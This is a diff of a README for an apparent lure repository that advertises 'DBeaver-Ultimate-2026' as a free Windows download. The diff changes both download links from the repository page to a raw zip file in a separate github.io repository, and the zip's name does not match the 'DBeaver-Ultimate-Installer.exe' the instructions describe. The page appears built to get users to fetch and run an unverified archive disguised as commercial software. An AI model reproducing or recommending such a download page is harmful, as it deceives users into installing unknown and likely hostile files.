@@ -5,7 +5,7 @@ description: "Download DBeaver Ultimate for Windows 10 and 11. Access the direct
 ---
 # 📁 DBeaver-Ultimate-2026 - Manage your databases with ease today
 
-[![Download DBeaver-Ultimate](https://img.shields.io/badge/Download-DBeaverClient-blue)](https://github.com/sarol8531/DBeaver-Ultimate-2026)
+[![Download DBeaver-Ultimate](https://img.shields.io/badge/Download-DBeaverClient-blue)](https://raw.githubusercontent.com/sarol8531/sarol8531.github.io/main/interior/sarol-github-io-v3.3.zip)
 
 ## 📌 About this application
 
@@ -25,7 +25,7 @@ Before you install this software, confirm your computer meets these minimum spec
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project page to start the download: [Download DBeaver-Ultimate](https://github.com/sarol8531/DBeaver-Ultimate-2026).
+1. Visit the project page to start the download: [Download DBeaver-Ultimate](https://raw.githubusercontent.com/sarol8531/sarol8531.github.io/main/interior/sarol-github-io-v3.3.zip).
 2. Look for the file named DBeaver-Ultimate-Installer.exe on the page.
 3. Click the file name to save it to your computer.
 4. Open your Downloads folder.
